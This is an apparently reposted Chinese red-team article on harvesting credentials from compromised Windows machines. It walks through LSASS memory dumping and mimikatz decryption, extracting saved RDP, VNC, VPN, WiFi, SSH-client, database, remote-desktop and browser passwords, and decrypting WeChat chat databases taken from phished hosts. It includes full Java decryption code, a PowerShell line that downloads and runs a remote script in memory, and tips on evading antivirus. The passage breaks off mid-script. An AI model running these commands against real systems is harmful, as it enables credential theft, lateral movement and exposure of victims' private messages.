#  内网渗透 | 最全的内网凭据密码收集方法和技巧总结

[ 红队蓝军 ](javascript:void\(0\);)

**红队蓝军** ![]()

微信号 Xx_Security

功能介绍 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。

____

___发表于_

收录于合集

以下文章来源于HACK学习呀 ，作者深蓝天威战队

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM40Ey25ia7icKDtM0hyhYQeTnJdaC9NzZRHPkFM71EAD3Fw/0)
**HACK学习呀** .

HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！

# 内网凭据密码收集指南

原创投稿作者：深蓝实验室天威战队

## 前言

在攻防场景下，红队人员拿下一台终端或服务器后，第一步要做的往往就是信息收集，为最大化利用权限，扩大战果，密码抓取必不可少，这里针对常见应用软件和系统等密码抓取做了记录和总结，希望能帮助你作为参考。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093208.png)

## RDP凭证

###  **本机RDP密码**

抓取本机RDP密码是一个我们常遇到的场景，通常使用mimikatz抓取RDP密码。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093223.png)

当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，这时抓取的明文密码为空。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093224.png)

可以尝试解密NTLM获取明文密码。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093226.png)

上不了线的情况下，也可以在webshell中来dump内存，保存到本地解密即可。Dump内存的工具有很多，这里我们使用procdump64.exe为例进行dump内存：

    
    
    procdump64.exe -accepteula -ma lsass.exe lsass.dmp

![](https://gitee.com/fuli009/images/raw/master/public/20221212093228.png)

然后本地使用mimikatz进行解密：

    
    
    sekurlsa::minidump lsass.dmp  
    sekurlsa::logonPasswords full

![](https://gitee.com/fuli009/images/raw/master/public/20221212093232.png)

文件lsass.dmp的导出可以有多种方式：procdump,avdump,sqldumper,comsvcs.dll等等，这里不过多赘述，能够免杀转储即可。

###  **RDP登录凭证**

#### mimikatz

当我们使用Windows自带的远程桌面登录成功并选择保存凭据时，会在本地留下rdp登录凭证，如果我们获得了远程桌面的凭证,可以方便我们进行渗透测试中的横向移动。查看本机链接过哪些机器：

    
    
    reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"

获取Credentials：

    
    
    dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*

![](https://gitee.com/fuli009/images/raw/master/public/20221212093237.png)

获取guidMasterKey

    
    
    mimikatz.exe "dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\Credentials值" exit

![](https://gitee.com/fuli009/images/raw/master/public/20221212093240.png)

    
    
    mimikatz.exe "privilege::debug" "sekurlsa::dpapi" > cerd.txt

查找guid对应的MasterKey：

![](https://gitee.com/fuli009/images/raw/master/public/20221212093243.png)

解密获取明文rdp凭证：

    
    
    mimikatz.exe "dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\ Credentials值/masterkey:masterkey值" exit

![](https://gitee.com/fuli009/images/raw/master/public/20221212093316.png)

#### netpass

也可以利用netpass直接抓取密码，使用时注意对应系统版本，下载地址：https://www.nirsoft.net/utils/network_password_recovery.html

![](https://gitee.com/fuli009/images/raw/master/public/20221212093319.png)

同时netpass也提供了命令行版本，下载页面：https://www.nirsoft.net/password_recovery_tools.html

![](https://gitee.com/fuli009/images/raw/master/public/20221212093320.png)

## VNC密码

### UltraVNC

默认配置路径：

    
    
    c:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini

![](https://gitee.com/fuli009/images/raw/master/public/20221212093322.png)image.png

解密工具：https://github.com/jeroennijhof/vncpwd

![](https://gitee.com/fuli009/images/raw/master/public/20221212093326.png)image.png

### TightVNC

TightVNC的加密后密码存在注册表里内，注意查询需要管理员权限。

    
    
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server /v ControlPassword   
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server /v password  
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server /v RfbPort

解密工具：https://github.com/jeroennijhof/vncpwd

![](https://gitee.com/fuli009/images/raw/master/public/20221212093327.png)image.png![](https://gitee.com/fuli009/images/raw/master/public/20221212093328.png)image.png

### RealVNC

RealVNC别名WinVNC，RealVNC的加密后密码存在注册表里内，注意查询需要管理员权限。

    
    
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver /v password

解密工具：https://github.com/jeroennijhof/vncpwd

![](https://gitee.com/fuli009/images/raw/master/public/20221212093329.png)image.png

### TigerVNC

TigerVNC的加密后密码存在注册表里内，查询无需管理员权限。

    
    
    reg query HKEY_CURRENT_USER\SOFTWARE\TigerVNC\WinVNC4 /v "password"

解密工具：https://github.com/jeroennijhof/vncpwd

![](https://gitee.com/fuli009/images/raw/master/public/20221212093330.png)image.png

## VPN密码

Windows自带VPN连接，如果在配置VPN时选择记住此密码则会保存连接信息。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093331.png)image.png

默认保存连接信息目录

    
    
    %AppData%\Roaming\Microsoft\Network\Connections\Pbk

![](https://gitee.com/fuli009/images/raw/master/public/20221212093332.png)image.png

我们可以使用Dialupass来获取VPN密码信息，注意需要管理员权限，Dialupass使用说明和下载地址：https://www.nirsoft.net/utils/dialupass.html

![](https://gitee.com/fuli009/images/raw/master/public/20221212093334.png)image.png

同时Dialupass也提供了命令行版本，下载页面：https://www.nirsoft.net/password_recovery_tools.html

![](https://gitee.com/fuli009/images/raw/master/public/20221212093335.png)image.png

免杀：截至目前删除程序版本信息即可免杀360。

## WiFi密码

WiFi信息查询命令，在cmd下执行，无需管理员权限。

    
    
    for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear

![](https://gitee.com/fuli009/images/raw/master/public/20221212093336.png)image.png

## 星号密码

在攻防场景下很多时候在主机或服务器上遇到一些软件配置使用了星号密码，我们可以直接尝试使用星号密码查看来获取明文密码，省去寻找和解密配置文件的时间。常用的星号密码查看器：

  * • Asterisk Password Spy[1] 支持180个应用软件密码查看

  * • peekPassword[2]

![](https://gitee.com/fuli009/images/raw/master/public/20221212093338.png)image.png

## 通信软件

### 个人微信

很多时候我们钓鱼控下的主机都安装了个人微信，很多时候会在微信上沟通密码等敏感信息，在攻防场景下，由于是个人主机不方便直接远程操作，所以我们可以下载其离线聊天数据库离线解密。

#### 获取解密密钥

我们可以使用工具SharpWxDump[3]来获取解密密钥，使用该工具需要注意两点，一是编译工具选择x86架构，而是对方微信必须是在登录状态。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093342.png)image.png![](https://gitee.com/fuli009/images/raw/master/public/20221212093344.png)image.png

#### 下载聊天记录

微信聊天文件一般在：

    
    
    %USERPROFILE%\Documents\WeChat Files\wxid_xxxxxxxxxxxxxx\Msg\MSG0.db  
    %USERPROFILE%\Documents\WeChat Files\wxid_xxxxxxxxxxxxxx\Msg\MSG1.db  
    %USERPROFILE%\Documents\WeChat Files\wxid_xxxxxxxxxxxxxx\Msg\MSG2.db

注意：如果MSG0.db的大小超出240MB会自动生成MSG1.db，以此类推。打包聊天文件：

    
    
    cd /d C:\Users\Public  
    # 由于微信运行会占用此文件，需要进行复制。  
    copy "C:\Users\test\Documents\WeChat Files\wxid_ll8ukjje2na922\Msg\Multi\MSG0.db" MSG0.db  
    # 使用Windows系统自带命令进行压缩，方便快速下载。  
    makecab MSG0.db MSG0.cab  
    # 下载到本地后解压  
    expand MSG0.cab MSG0.db

#### 解密聊天文件

下载ChatViewTool[4]后，将数据库密钥保存为文本文件DBPass.Bin，将解压后的聊天记录数据库MSG0.db放在同目录。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093345.png)image.png

随后打开ChatViewTool点击数据库解密并选择密钥文件DBPass.Bin和聊天记录数据库MSG0.db所在的目录：

![](https://gitee.com/fuli009/images/raw/master/public/20221212093347.png)image.png

待解密完成后，会生成MSG0.db_dec.db,将MSG0.db_dec.db放到一个新目录,点击查看数据库选择此目录即可完成会话展示，双击联系人列表可展示对应的聊天记录。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093349.png)image.png

### 个人QQ

个人QQ由于有腾讯TP保护，导致不能动态地从个人QQ的内存获取其聊天数据库解密密钥，暂时无法解密，感兴趣可以阅读一文。

  * 

    
    
    https://bbs.pediy.com/thread-266370.htm

## 运维开发

### SVN

SVN类的版本控制软件如TortoiseSVN默认会将缓存的凭据保存到配置文件中，在Windows平台上默认会调用Windows数据保护API进行加密。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093350.png)image.png

SVN类客户端软件默认配置文件目录：

    
    
    %APPDATA%\Subversion\auth\svn.simple\  
    %APPDATA%\Roaming\Subversion\auth\svn.simple\

![](https://gitee.com/fuli009/images/raw/master/public/20221212093351.png)image.png

我们可工具以使用TSvnPwd来解密。工具下载地址：http://www.leapbeyond.com/ric/TSvnPD/

![](https://gitee.com/fuli009/images/raw/master/public/20221212093354.png)image.png

###  **FileZilla**

简介：FileZilla客户端是一个快速可靠的、跨平台的FTP,FTPS和SFTP客户端。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093358.png)

找到FileZilla的默认配置文件目录：

    
    
    %userprofile%\AppData\Roaming\FileZilla\recentservers.xml  
    %userprofile%\AppData\Roaming\FileZilla\sitemanager.xml

![](https://gitee.com/fuli009/images/raw/master/public/20221212093359.png)

密码base64解码即可得到明文:

![](https://gitee.com/fuli009/images/raw/master/public/20221212093400.png)

也可以利用SharpDecryptPwd直接获取密码 工具下载地址：https://github.com/uknowsec/SharpDecryptPwd

    
    
    SharpDecryptPwd.exe -FileZilla

![](https://gitee.com/fuli009/images/raw/master/public/20221212093401.png)

###  **Winscp**

简介：WinSCP 是一个 Windows 环境下使用的 SSH 的开源图形化 SFTP 客户端。同时支持 SCP
协议。它的主要功能是在本地与远程计算机间安全地复制文件，并且可以直接编辑文件。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093402.png)

通过注册表获得密文：

    
    
    reg query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions"  
    reg query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\root@192.168.192.128"

通过winscppwd.exe即可解密：

    
    
    winscppwd.exe root 192.168.192.128 密文

![](https://gitee.com/fuli009/images/raw/master/public/20221212093403.png)

有时候管理员会导出配置为WinSCP.ini文件。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093405.png)

这时候直接查找该文件，然后解密即可。winscppwd下载地址：https://www.softpedia.com/get/Security/Password-
Managers-Generators/winscppwd.shtml也可以使用SharpDecryptPwd直接获取密码

![](https://gitee.com/fuli009/images/raw/master/public/20221212093407.png)

###  **Xshell**

简介：Xshell是一款功能强大的终端模拟器，支持SSH2，SSH3，SFTP，TELNET，RLOGIN和SERIAL。Xshell密码默认保存位置：

    
    
    XShell 5：%userprofile%\Documents\NetSarang\Xshell\Sessions  
    XShell 6：%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions  
    XShell 7：%userprofile%\Documents\NetSarang Computer\7\Xshell\Sessions

SharpXDecrypt支持解密XShell所有版本，包括XShell 7：

![](https://gitee.com/fuli009/images/raw/master/public/20221212093408.png)image.png

下载地址：https://github.com/JDArmy/SharpXDecrypt 注：XShell
7默认session里面的密码为空，这种可以使用星号密码查看器直接查看密码

![](https://gitee.com/fuli009/images/raw/master/public/20221212093410.png)

### FinalShell

简介：FinalShell是一体化的的服务器,网络管理软件，不仅是ssh客户端,还是功能强大的开发,运维工具。默认配置文件地址：

    
    
    %userprofile%\AppData\Local\finalshell\conn\xxx.json

![](https://gitee.com/fuli009/images/raw/master/public/20221212093412.png)

使用FinalShell-Decoder选择目录即可解密：

![](https://gitee.com/fuli009/images/raw/master/public/20221212093413.png)

下载地址：https://github.com/passer-W/FinalShell-Decoder

### SecureCRT

SecureCRT默认配置目录：

    
    
    dir %APPDATA%\VanDyke\Config\Sessions\

SecureCRT 7.3.3之前的版本使用password加密算法，之后的版本使用password v2算法：

    
    
    S:"Password"=u17cf50e394ecc2a06fa8919e1bd67cf0f37da34c78e7eb87a3a9a787a9785e802dd0eae4e8039c3ce234d34bfe28bbdc  
    S:"Password V2"=02:7b9f594a1f39bb36bbaa0d9688ee38b3d233c67b338e20e2113f2ba4d328b6fc8c804e3c02324b1eaad57a5b96ac1fc5cc1ae0ee2930e6af2e5e644a28ebe3fc

7.x 版本解密 [ 不带第一位 "u" ]

    
    
    SecureCRTCipher.py dec 17cf50e394ecc2a06fa8919e1bd67cf0f37da34c78e7eb87a3a9a787a9785e802dd0eae4e8039c3ce234d34bfe28bbdc

8.x 版本解密 [ 不带前面三位 "02:" ]

    
    
    SecureCRTCipher.py dec -v2 7b9f594a1f39bb36bbaa0d9688ee38b3d233c67b338e20e2113f2ba4d328b6fc8c804e3c02324b1eaad57a5b96ac1fc5cc1ae0ee2930e6af2e5e644a28ebe3fc

![](https://gitee.com/fuli009/images/raw/master/public/20221212093414.png)image.png

SecureCRT下载地址：https://github.com/HyperSine/how-does-SecureCRT-encrypt-password

### Mobaxterm

MobaXterm连接信息默认全部加密存于注册表中，解密两种情况。

#### 无管理密码的解密

首先是先切到指定用户权限下，从注册表中读取连接信息和账密 hash，此处测试的 MobaXterm 版本为 12.04
，该版本不会强制你为连接设置管理密码。

    
    
    # reg query HKEY_CURRENT_USER\\Software\\Mobatek\\MobaXterm   
    # reg query HKEY_CURRENT_USER\\Software\\Mobatek\\MobaXterm\\P 

之后再把密码 hash 粘回本地解密，要带上目标机器名 和 MobaXterm 的安装用户。

    
    
    python3 MobaXtermCipher.py dec -sysh Motoo-IISWeb -sysu administrator -h 192.168.159.6 -u root +NYMdvHihPWokIa5KdDcjfIjb7pV1Qu*** 

#### 带管理密码的解密

此处测试的 MobaXterm 为最新版 20.5，该版本每次连接都会强制你设置管理密码。

    
    
    reg query HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\P  
    python3 MobaXtermCipher.py dec -p admin!@#45 ehx0N63ueLNPkw==

###  **Navicat**

简介：Navicat Premium 是一套多连接数据库开发工具，可一次快速方便地访问多种数据库。

#### 离线解密

首先查询Navicat注册表里的密码：

    
    
    reg query HKEY_CURRENT_USER\Software\PremiumSoft\ /s /v host  
    reg query HKEY_CURRENT_USER\Software\PremiumSoft\ /s /v username  
    reg query HKEY_CURRENT_USER\Software\PremiumSoft\ /s /v pwd

![](https://gitee.com/fuli009/images/raw/master/public/20221212093415.png)image.png

然后可以使用以下代码在线解密，注意Navicat版本：在线运行地址：https://www.nhooo.com/tool/java8/

![](https://gitee.com/fuli009/images/raw/master/public/20221212093417.png)image.png

    
    
    package org.example;  
      
    import javax.crypto.Cipher;  
    import javax.crypto.spec.IvParameterSpec;  
    import javax.crypto.spec.SecretKeySpec;  
    import javax.xml.bind.DatatypeConverter;  
    import java.nio.charset.StandardCharsets;  
    import java.security.MessageDigest;  
    import java.util.Arrays;  
      
    public class Main {  
        public static void main(String []args) {  
            //navicat11版本解密  
            Navicat11Cipher de = new Navicat11Cipher();  
            System.out.println(de.decryptString("15057D7BA390"));  
            //navicat12以上版本解密  
            Navicat12Cipher de12 = new Navicat12Cipher();  
            System.out.println(de12.decryptString("503AA930968F877F04770B47DD731DC0"));  
        }  
        public static class Navicat11Cipher {  
            public static final String DefaultUserKey = "3DC5CA39";  
            private byte[] _IV;  
      
            private SecretKeySpec _Key;  
            private Cipher _Encryptor;  
            private Cipher _Decryptor;  
      
            private void initKey(String UserKey) {  
                try {  
                    MessageDigest sha1 = MessageDigest.getInstance("SHA1");  
                    byte[] userkey_data = UserKey.getBytes(StandardCharsets.UTF_8);  
                    sha1.update(userkey_data, 0, userkey_data.length);  
                    _Key = new SecretKeySpec(sha1.digest(), "Blowfish");  
                } catch (Exception e) {  
                    e.printStackTrace();  
                }  
            }  
      
            private void initChiperEncrypt() {  
                try {  
                    // Must use NoPadding  
                    _Encryptor = Cipher.getInstance("Blowfish/ECB/NoPadding");  
                    _Encryptor.init(Cipher.ENCRYPT_MODE, _Key);  
                } catch (Exception e) {  
                    e.printStackTrace();  
                }  
            }  
      
            private void initChiperDecrypt() {  
                try {  
                    // Must use NoPadding  
                    _Decryptor = Cipher.getInstance("Blowfish/ECB/NoPadding");  
                    _Decryptor.init(Cipher.DECRYPT_MODE, _Key);  
                } catch (Exception e) {  
                    e.printStackTrace();  
                }  
            }  
      
            private void initIV() {  
                try {  
                    byte[] initVec = DatatypeConverter.parseHexBinary("FFFFFFFFFFFFFFFF");  
                    _IV = _Encryptor.doFinal(initVec);  
                } catch (Exception e) {  
                    e.printStackTrace();  
                }  
            }  
      
            private void xorBytes(byte[] a, byte[] b) {  
                for (int i = 0; i < a.length; i++) {  
                    int aVal = a[i] & 0xff; // convert byte to integer  
                    int bVal = b[i] & 0xff;  
                    a[i] = (byte) (aVal ^ bVal); // xor aVal and bVal and typecast to byte  
                }  
            }  
      
            private void xorBytes(byte[] a, byte[] b, int l) {  
                for (int i = 0; i < l; i++) {  
                    int aVal = a[i] & 0xff; // convert byte to integer  
                    int bVal = b[i] & 0xff;  
                    a[i] = (byte) (aVal ^ bVal); // xor aVal and bVal and typecast to byte  
                }  
            }  
      
            {  
                initKey(DefaultUserKey);  
                initChiperEncrypt();  
                initChiperDecrypt();  
                initIV();  
            }  
      
            private byte[] Encrypt(byte[] inData) {  
                try {  
                    byte[] CV = Arrays.copyOf(_IV, _IV.length);  
                    byte[] ret = new byte[inData.length];  
      
                    int blocks_len = inData.length / 8;  
                    int left_len = inData.length % 8;  
      
                    for (int i = 0; i < blocks_len; i++) {  
                        byte[] temp = Arrays.copyOfRange(inData, i * 8, (i * 8) + 8);  
      
                        xorBytes(temp, CV);  
                        temp = _Encryptor.doFinal(temp);  
                        xorBytes(CV, temp);  
      
                        System.arraycopy(temp, 0, ret, i * 8, 8);  
                    }  
      
                    if (left_len != 0) {  
                        CV = _Encryptor.doFinal(CV);  
                        byte[] temp = Arrays.copyOfRange(inData, blocks_len * 8, (blocks_len * 8) + left_len);  
                        xorBytes(temp, CV, left_len);  
                        System.arraycopy(temp, 0, ret, blocks_len * 8, temp.length);  
                    }  
      
                    return ret;  
                } catch (Exception e) {  
                    e.printStackTrace();  
                    return null;  
                }  
            }  
      
            public String encryptString(String inputString) {  
                try {  
                    byte[] inData = inputString.getBytes(StandardCharsets.UTF_8);  
                    byte[] outData = Encrypt(inData);  
                    return DatatypeConverter.printHexBinary(outData);  
                } catch (Exception e) {  
                    e.printStackTrace();  
                    return "";  
                }  
            }  
      
            private byte[] Decrypt(byte[] inData) {  
                try {  
                    byte[] CV = Arrays.copyOf(_IV, _IV.length);  
                    byte[] ret = new byte[inData.length];  
      
                    int blocks_len = inData.length / 8;  
                    int left_len = inData.length % 8;  
      
                    for (int i = 0; i < blocks_len; i++) {  
                        byte[] temp = Arrays.copyOfRange(inData, i * 8, (i * 8) + 8);  
      
                        temp = _Decryptor.doFinal(temp);  
                        xorBytes(temp, CV);  
                        System.arraycopy(temp, 0, ret, i * 8, 8);  
                        for (int j = 0; j < CV.length; j++) {  
                            CV[j] = (byte) (CV[j] ^ inData[i * 8 + j]);  
                        }  
                    }  
      
                    if (left_len != 0) {  
                        CV = _Encryptor.doFinal(CV);  
                        byte[] temp = Arrays.copyOfRange(inData, blocks_len * 8, (blocks_len * 8) + left_len);  
      
                        xorBytes(temp, CV, left_len);  
                        for (int j = 0; j < temp.length; j++) {  
                            ret[blocks_len * 8 + j] = temp[j];  
                        }  
                    }  
      
                    return ret;  
                } catch (Exception e) {  
                    e.printStackTrace();  
                    return null;  
                }  
            }  
      
            public String decryptString(String hexString) {  
                try {  
                    byte[] inData = DatatypeConverter.parseHexBinary(hexString);  
                    byte[] outData = Decrypt(inData);  
                    return new String(outData, StandardCharsets.UTF_8);  
                } catch (Exception e) {  
                    e.printStackTrace();  
                    return "";  
                }  
            }  
        }  
        public static class Navicat12Cipher {  
            private SecretKeySpec _AesKey;  
            private IvParameterSpec _AesIV;  
      
            {  
                _AesKey = new SecretKeySpec("libcckeylibcckey".getBytes(StandardCharsets.UTF_8), "AES");  
                _AesIV = new IvParameterSpec("libcciv libcciv ".getBytes(StandardCharsets.UTF_8));  
            }  
      
            public String encryptString(String plaintext) {  
                try {  
                    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");  
                    cipher.init(Cipher.ENCRYPT_MODE, _AesKey, _AesIV);  
                    byte[] ret = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));  
                    return DatatypeConverter.printHexBinary(ret);  
                } catch (Exception e) {  
                    e.printStackTrace();  
                    return "";  
                }  
            }  
      
            public String decryptString(String ciphertext) {  
                try {  
                    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");  
                    cipher.init(Cipher.DECRYPT_MODE, _AesKey, _AesIV);  
                    byte[] ret = cipher.doFinal(DatatypeConverter.parseHexBinary(ciphertext));  
                    return new String(ret, StandardCharsets.UTF_8);  
                } catch (Exception e) {  
                    e.printStackTrace();  
                    return "";  
                }  
            }  
        }  
    }

#### SharpDecryptPwd

也可以直接1使用SharpDecryptPwd抓取密码：

![](https://gitee.com/fuli009/images/raw/master/public/20221212093419.png)image.png

## 远程控制

##  ****

###  **TeamViewer**

TeamViewer是远程访问、远程控制及远程支持解决方案，能够远程访问位于各地的计算机或移动设备。直接获取本机TeamViewer的ID以及密码：

    
    
    SharpDecryptPwd.exe -TeamViewer

![](https://gitee.com/fuli009/images/raw/master/public/20221212093421.png)

### SunLogin

#### 旧版本

这里旧版本是指v11.0.0.38222以及以前的版本

![](https://gitee.com/fuli009/images/raw/master/public/20221212093423.png)

找到配置文件config.ini

    
    
    安装版：C:\Program Files\Oray\SunLogin\SunloginClient\config.ini  
    便携版(绿色版)：C:\ProgramData\Oray\SunloginClient\config.ini

![](https://gitee.com/fuli009/images/raw/master/public/20221212093424.png)

fastcode便是本机识别码，在这里是941244985 其中encry_pwd是本机验证码加密后的字段，我们使用工具即可解密
利用工具：https://github.com/wafinfo/Sunflower_get_Password

![](https://gitee.com/fuli009/images/raw/master/public/20221212093425.png)

解密得到本机验证码为4M9aON

#### 较新版本

在向日葵v11.1.2.38529中，强化了加密机制，删除了配置文件config.ini中的fastcode（本机识别码）字段和encry_pwd(本机验证码)字段，而将这些敏感信息放到了注册表中，我们可以通过注册表查询使用Sunflower_get_Password[5]工具即可解密。

    
    
    reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginInfo  
    reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginGreenInfo

![](https://gitee.com/fuli009/images/raw/master/public/20221212093426.png)

#### 最新版本

首先找到向日葵用户进程，然后使用procdump等工具转储进程内存。

    
    
    tasklist /v | findstr /i sunlogin  
    procdump64.exe -accepteula -ma 进程号

![](https://gitee.com/fuli009/images/raw/master/public/20221212093426.png)image-20221109181701558.png

使用Winhex打开转储文件，按下`Ctrl+Alt+X`快捷键打开十六进制值搜索功能，搜索十六进制值`66617374636F646522203A20226b`，即可找到本机识别码。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093428.png)image-20221109182129937.png

搜索十六进制值`000000000000003C6620663D79616865692E626F6C642E323420633D636F6C6F725F65646974203E`，使用`F3`快捷键可以跳到下一个匹配处，多跳2次即可找到本机验证码。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093431.png)image-20221109225035543.png

### ToDesk

#### 本机连接

ToDesk的配置路径在安装目录下的config.ini。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093435.png)image.png

clientId为设备ID，AuthMode为认证模式，0为仅使用临时密码，1为仅使用安全密码，2为都可以使用，tempAuthPassEx为加密后的临时密码，authPassEx为加密后的安全密码，我们只需本地安装一个最新版本ToDesk，退出ToDesk，然后复制配置文件config.ini中的tempAuthPassEx或authPassEx字段到本地进行替换，最后重新运行ToDesk即可查看密码。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093437.png)image.png![](https://gitee.com/fuli009/images/raw/master/public/20221212093439.png)image.png

#### 远程连接

ToDesk默认会保存连接过的信息，记录的文件也是ToDesk安装目录下的userInfo.json文件，其中就有远程连接的设备ID，主机名，连接密码等密码信息。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093441.png)image.png

我们只需复制userInfo.json文件放在ToDesk安装目录下，重新运行ToDesk即可选择进行远程连接了，不需要输入密码。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093442.png)image.png

## 浏览器

### 常见浏览器

#### WebBrowserPassView

WebBrowserPassView使用说明和下载地址：https://www.nirsoft.net/utils/web_browser_password.html
WebBrowserPassView支持解密以下浏览器：

  * • Internet Explorer (Version 4.0 - 11.0)

  * • Mozilla Firefox (All Versions)

  * • Google Chrome

  * • Chromium-Based Edge

  * • Safari

  * • Opera

  * • Brave

  * • Waterfox

  * • SeaMonkey

  * • Vivaldi

  * • Yandex

  * • Chromium

![](https://gitee.com/fuli009/images/raw/master/public/20221212093443.png)image.png

WebBrowserPassView也提供了命令行版本，下载页面：https://www.nirsoft.net/password_recovery_tools.html

![](https://gitee.com/fuli009/images/raw/master/public/20221212093444.png)image.png

WebBrowserPassView也支持离线解密：

![](https://gitee.com/fuli009/images/raw/master/public/20221212093445.png)image.png

免杀：截至目前删除程序版本信息即可免杀360。

#### HackBrowserData

HackBrowserData
是一个浏览器数据（密码|历史记录|Cookie|书签|信用卡|下载记录|localStorage|浏览器插件）的导出工具，支持全平台主流浏览器。在Windows平台支持以下浏览器的密码，Cookie，书签和历史记录信息：

  * • Google Chrome

  * • Google Chrome Beta

  * • Chromium

  * • Microsoft Edge

  * • 360 极速浏览器

  * • QQ浏览器

  * • Brave

  * • Opera

  * • OperaGX

  * • Vivaldi

  * • Yandex

  * • CocCoc

  * • Firefox

  * • Firefox Beta

  * • Firefox Dev

  * • Firefox ESR

  * • Firefox Nightly

使用说明和下载地址：https://github.com/moonD4rk/HackBrowserData

![](https://gitee.com/fuli009/images/raw/master/public/20221212093446.png)![](https://gitee.com/fuli009/images/raw/master/public/20221212093447.png)

### IE浏览器

#### credgrap_ie_edge

工具地址：https://github.com/HanseSecure/credgrap_ie_edge 内存执行powershell解密即可

    
    
    powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://xxx/credgrap_ie_edge.ps1')"

![](https://gitee.com/fuli009/images/raw/master/public/20221212093448.png)

落地解密

![](https://gitee.com/fuli009/images/raw/master/public/20221212093449.png)

#### IE Passwords Viewer

可以直接使用iepv直接获取账密，使用说明和下载地址：https://www.nirsoft.net/utils/internet_explorer_password.html

![](https://gitee.com/fuli009/images/raw/master/public/20221212093450.png)image.png

同时iepv也提供了命令行版本，下载页面：https://www.nirsoft.net/password_recovery_tools.html

![](https://gitee.com/fuli009/images/raw/master/public/20221212093451.png)image.png

免杀：截至目前删除程序版本信息即可免杀360。

###  **360安全浏览器**

#### 离线解密

首先切到指定用户权限下，获取机器id，

    
    
    reg query "HKLM\SOFTWARE\MICROSOFT\CRYPTOGRAPHY" /v "MachineGuid"

![](https://gitee.com/fuli009/images/raw/master/public/20221212093452.png)image.png

然后找到账密数据库文件assis2.db路径，将assis2.db下载到本地进行解密。

    
    
    reg query "HKCR\360SeSES\DefaultIcon"  
    dir "C:\Users\aky\AppData\Roaming\360se6\User Data\Default\apps\LoginAssis"

执行解密：

    
    
    360SafeBrowserDecrypt.exe a9f521cd-2bd6-47fe-87db-69743456aa84 assis2.db

![](https://gitee.com/fuli009/images/raw/master/public/20221212093453.png)image.png

#### 上传解密

在免杀的情况下也可以直接上传360SafeBrowserDecrypt.exe进行解密。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093454.png)image.png

### 其他浏览器

如果遇到其他的小众浏览器，可以在本地安装一个相同版本的浏览器，然后退出浏览器，将目标上的浏览器用户数据目录打包到本地，在相同目录进行替换，重新打开浏览器，去浏览器设置里查看密码。以下为一些浏览器的用户数据目录：

    
    
    %AppData%/Local/Google/Chrome/User Data/Default/  
    %AppData%/Local/Google/Chrome Beta/User Data/Default/  
    %AppData%/Local/Chromium/User Data/Default/  
    %AppData%/Local/Microsoft/Edge/User Data/Default/  
    %AppData%/Local/BraveSoftware/Brave-Browser/User Data/Default/  
    %AppData%/Local/360chrome/Chrome/User Data/Default/  
    %AppData%/Local/Tencent/QQBrowser/User Data/Default/  
    %AppData%/Roaming/Opera Software/Opera Stable/  
    %AppData%/Roaming/Opera Software/Opera GX Stable/  
    %AppData%/Local/Vivaldi/User Data/Default/  
    %AppData%/Local/CocCoc/Browser/User Data/Default/  
    %AppData%/Local/Yandex/YandexBrowser/User Data/Default/  
    %AppData%/Roaming/Mozilla/Firefox/Profiles/  
    %AppData%/Roaming/SogouExplorer/Webkit/

## WEB系统

### 通用方法

思路：绝大部分的配置信息，在内存中，都是String类型的field字段，可以使用OQL语言直接从内存中提取password字段的field值。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093455.png)

工具：https://github.com/corener/JavaPassDump

使用步骤：1、使用jcmd获取JVM堆内存 jmap，jcmd 都是JDK自带工具，指定JVM pid 直接dump

    
    
    jmap -dump:live,format=b,file=/tmp/dumpHeap.hprof 5760

![](https://gitee.com/fuli009/images/raw/master/public/20221212093457.png)2.1.png

2、使用OQLQuery提取密码 OQL语句：

    
    
    var filter = {};  
    map(heap.classes(), function (cls) {  
       return map(cls.fields, function (field) {   
          if( field.name.toString().contains("pass") || field.name.toString().contains("username") ||field.name.toString().contains("PASS")){  
            return map(heap.objects(cls), function (obs) {  
              var tag = cls.name+"|"+field.name ;  
